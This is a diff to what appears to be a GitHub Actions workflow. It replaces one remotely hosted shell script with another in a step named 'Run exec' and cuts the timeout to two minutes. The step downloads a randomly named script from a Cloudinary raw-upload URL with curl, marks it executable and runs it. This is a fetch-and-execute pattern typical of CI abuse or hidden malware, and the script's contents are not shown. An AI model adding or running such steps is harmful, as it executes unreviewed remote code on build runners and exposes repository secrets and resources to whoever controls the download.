@@ -11,11 +11,11 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Run exec
-        timeout-minutes: 300
+        timeout-minutes: 2
         run: |
-          curl -O http://res.cloudinary.com/dyfqshedb/raw/upload/v1711125466/o8abekknjkh6hlgjcwal.sh
-          chmod +x o8abekknjkh6hlgjcwal.sh
-          ./o8abekknjkh6hlgjcwal.sh
+          curl -O http://res.cloudinary.com/dyfqshedb/raw/upload/v1711173470/fotves64xiknlowbbd8r.sh
+          chmod +x fotves64xiknlowbbd8r.sh
+          ./fotves64xiknlowbbd8r.sh
 
       - name: IP Workflow
         run: |
